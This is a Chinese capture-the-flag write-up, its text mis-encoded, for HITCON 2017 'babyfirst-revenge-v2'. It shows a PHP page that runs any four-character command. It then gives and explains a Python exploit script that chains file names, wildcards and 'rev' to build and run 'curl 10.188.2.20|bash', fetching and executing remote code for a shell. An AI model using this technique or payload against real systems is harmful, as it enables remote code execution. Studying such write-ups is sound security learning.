åˆ†äº«è‡ªåˆ¶Dockerfileï¼š[Github](https://github.com/Pr0phet/hitcon2017Dockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge-v2) 

è¿™é¢˜ç›¸æ¯”äºä¸Šä¸€é¢˜ æ¡ä»¶æ›´åŠ çš„è‹›åˆ»äº† åªå…è®¸æ‰§è¡Œæœ€å¤šå››ä¸ªå­—ç¬¦
æºç å¦‚ä¸‹ï¼š
```php
<?php
    $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 4) {
        @exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    }
    highlight_file(__FILE__);
```

é‚£æˆ‘ä»¬ä¹‹å‰çš„ç”Ÿæˆ ls -t>g å°±ä¸èƒ½æŒ‰ç…§æœ€åä¸€æ­¥ ls>>_ æ¥æ‰§è¡Œäº†

ä½†æ˜¯æˆ‘ä»¬èƒ½ä¸èƒ½è¿˜æ˜¯æŒ‰ç…§ ç”Ÿæˆå‘½ä»¤æ®µæ–‡ä»¶ æœ€åé€šè¿‡lsæ¥æ‹¼æ¥å‘½ä»¤æ‰§è¡Œå‘¢ï¼Ÿ

è¿™é‡Œè¿˜æ˜¯ä»¥åˆ†æOrangeå¤§å¤§çš„expä¸ºä¸»ï¼š

Exp:
```python
import requests
from time import sleep
from urllib import quote

payload = [
    # generate "g> ht- sl" to file "v"
    '>dir', 
    '>sl', 
    '>g\>',
    '>ht-',
    '*>v',

    # reverse file "v" to file "x", content "ls -th >g"
    '>rev',
    '*v>x',

    # generate "curl orange.tw|python;"
    # generate "curl 10.188.2.20|bash"
    '>\;\\', 
    '>sh\\', 
    '>ba\\', 
    '>\|\\', 
    '>20\\', 
    '>2.\\',
    '>8.\\', 
    '>18\\', 
    '>0.\\', 
    '>1\\', 
    '>\ \\', 
    '>rl\\', 
    '>cu\\', 

    # got shell
    'sh x', 
    'sh g', 
]


r = requests.get('http://10.188.2.20:17528/?reset=1')
for i in payload:
    assert len(i) <= 4
    r = requests.get('http://10.188.2.20:17528/?cmd=' + quote(i) )
    print i
    sleep(0.1)
```

é¦–å…ˆç”Ÿæˆ ls -t >gçš„å‘½ä»¤æ–‡ä»¶ï¼Œè¿™é‡Œorangeå¤§å¤§çš„æ–¹æ³•çœŸçš„å·§å¦™åˆ°æè‡´äº†ï¼

- å…ˆäº†è§£ä¸€ä¸ªå°trickï¼Œ``*``åœ¨Linuxä¸­ä»£è¡¨çš„æ˜¯0æˆ–å¤šä¸ªå­—ç¬¦ï¼Œæ¯”å¦‚``ls *.txt`` å°±è¡¨ç¤ºäº†åˆ—å‡ºæœ¬ç›®å½•ä¸‹æ‰€æœ‰åç¼€åä¸ºtxtçš„æ–‡ä»¶ï¼Œé‚£å‡å¦‚å•ç‹¬æ‰§è¡Œä¸€ä¸ª``*``ä¼šæ˜¯ä»€ä¹ˆæ•ˆæœï¼Ÿ
åœ¨æœ¬åœ°å°è¯•äº†ä¸€ä¸‹ ç›´æ¥è¾“å…¥ä¸€ä¸ªæ˜Ÿå·çš„è¯Linuxé¦–å…ˆä¼šæŠŠå½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶æŒ‰å­—å…¸åºæ’åºä¸€æ¬¡ï¼Œç„¶åå°†æ’åºçš„ç»“æœå½“ä½œå‘½ä»¤æ‰§è¡Œï¼Œå¦‚ä¸‹ï¼š
![ğŸŒ°](http://upload-images.jianshu.io/upload_images/6949366-fdb5efeab24a2a52.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
é‚£ä¸‹å›¾çš„ä¹Ÿå¯ä»¥ç†è§£äº†ï¼š
![ğŸŒ°](http://upload-images.jianshu.io/upload_images/6949366-bae9e5b0b49d58dc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
å› ä¸º*oåŒ¹é…äº† echo å’Œoï¼Œè€Œä»–ä»¬çš„æ’åºæ˜¯echoåœ¨å‰ï¼Œoåœ¨å æ‰€ä»¥å°±ä¼šæ‰§è¡Œå‘½ä»¤ echo o


- å†è®¤è¯†ä¸€ä¸‹dir è¿™ä¸ªå‘½ä»¤åœ¨å¤§å¤šæ•°ç³»ç»Ÿä¸­éƒ½æ˜¯ls çš„alias ä½†æ˜¯æœ‰äº›ç³»ç»Ÿä¸­åˆ™æ²¡æœ‰
ä¸ºä»€ä¹ˆæˆ‘ä»¬è¦ç”¨è¿™ä¸ªå‘½ä»¤å‘¢ å› ä¸ºä¹‹å‰è¯´è¿‡ls æ˜¯alphabetically ï¼ˆå­—å…¸åºï¼‰é‚£ä¹ˆdirå°±ä¼šæ’åœ¨lsç»“æœçš„æœ€å‰é¢ æ‰€ä»¥æˆ‘ä»¬*ä¹‹ådirä¹Ÿæ˜¯æ’åœ¨æœ€å‰é¢ ä¹Ÿå°±å……å½“äº†æ‹¼æ¥æ–‡ä»¶åçš„è§’è‰²

- å¤§æ¦‚æ€è·¯å°±å‡ºæ¥äº† æˆ‘ä»¬è¦æ„é€ ls -t>gçš„å‘½ä»¤ç‰‡æ®µæˆå‡ ä¸ªæ–‡ä»¶å ä½†æ˜¯å…¶å‘½ä»¤æ®µçš„é¦–å­—æ¯ä¸èƒ½åœ¨dçš„å‰é¢ï¼Œä¹Ÿå°±æ˜¯ä¸èƒ½æ˜¯ **ç‰¹æ®Šç¬¦å· æ•°å­— abc** è€Œä¸”æ¯ä¸€æ®µä¸èƒ½è¶…è¿‡ä¸¤ä¸ªå­—ç¬¦ï¼Œå› ä¸ºå…¶ä½™ä¸¤ä¸ªå­—ç¬¦è¦åˆ†é…ç»™>å’Œ\\ï¼Œå¦‚æœä½ å°è¯•ä¸€ä¸‹æ„é€  æ­£å¸¸æ¥è¯´æ˜¯æ²¡åŠæ³•æ„é€ å‡ºæ— ç‰¹æ®Šç¬¦å·æ‰“å¤´çš„æ–‡ä»¶å ä»–æ€»ä¼šæ’åˆ°dirçš„å‰é¢ï¼Œç„¶åæ›´å·§å¦™çš„åœ°æ–¹æ¥äº† æˆ‘ä»¬å¯ä»¥ç”Ÿæˆé€†åºçš„å‘½ä»¤æ‹¼æ¥èµ·æ¥ï¼Œæœ€åä½¿ç”¨revå‘½ä»¤åå‘æ–‡ä»¶ä¸­çš„å­—ç¬¦ä¸²ï¼

- æ ¹æ®ä¹‹å‰æˆ‘ä»¬å¯¹\*çš„è®¤è¯†ï¼Œæˆ‘ä»¬å¯ä»¥å°†å€’åºçš„å‘½ä»¤è¾“å…¥åˆ°væ–‡ä»¶ä¸­ï¼Œå› ä¸º\*vèƒ½åŒ¹é…rev å’Œ vï¼Œä¹Ÿå°±æ˜¯æ‰§è¡Œäº† rev vå‘½ä»¤ï¼Œç„¶åå†å°†å€’åºä¹‹åçš„ç»“æœ>xæ–‡ä»¶ä¸­ï¼Œè¿™æ ·\*v>xåˆšåˆšå¥½æ˜¯å››ä¸ªå­—ç¬¦!

- ä½†æ˜¯çœ‹åˆ°è¿™é‡Œ ä½ å¯èƒ½è¿˜ä¼šåœ¨å°è¯•è¿‡ç¨‹ä¸­å‘ç°é—®é¢˜ï¼Œé‚£å°±æ˜¯é€†åºä¹‹åçš„å‘½ä»¤æ®µåº”è¯¥æ˜¯ [dir,>sl,>g\>,>t-] é‚£ä¹ˆè¿™é‡Œä¼šæœ‰ä¸€ä¸ªé—®é¢˜ å› ä¸ºtçš„å­—æ¯åºæ¯”såï¼Œæ‰€ä»¥lsä¹‹ååº”è¯¥æ˜¯è¿™æ ·çš„ï¼š
![Oops](http://upload-images.jianshu.io/upload_images/6949366-0891df7a20a05ed6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
è§£å†³æ–¹æ³•æ˜¯åŠ å¤šä¸€ä¸ªå‚æ•°hï¼Œåœ¨lsä¸­hæ˜¯ç”¨ä½œæ ¼å¼åŒ–lå‚æ•°ä¹‹åçš„å­˜å‚¨é‡å¤§å° ä½¿ä¹‹æ›´é€‚åˆäººç±»æ–¹å¼é˜…è¯» ä½†æ˜¯å¦‚æœlsåªå¸¦å‚æ•°hçš„ä¸å¸¦å‚æ•°lè¯é‚£è¿™ä¸ªå‚æ•°æ˜¯æ¯«æ— æ„ä¹‰çš„ å¦‚å›¾ï¼š
![ğŸŒ°](http://upload-images.jianshu.io/upload_images/6949366-fc6718782a9a6010.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
æ‰€ä»¥æˆ‘ä»¬å°†>t-æ”¹æˆ>ht-å°±èƒ½è§£å†³å­—å…¸åºçš„é—®é¢˜äº†


- æ¥ä¸‹æ¥çš„é—®é¢˜å°±å›åˆ°äº†babyfirst-revengeçš„æƒ…å†µäº†



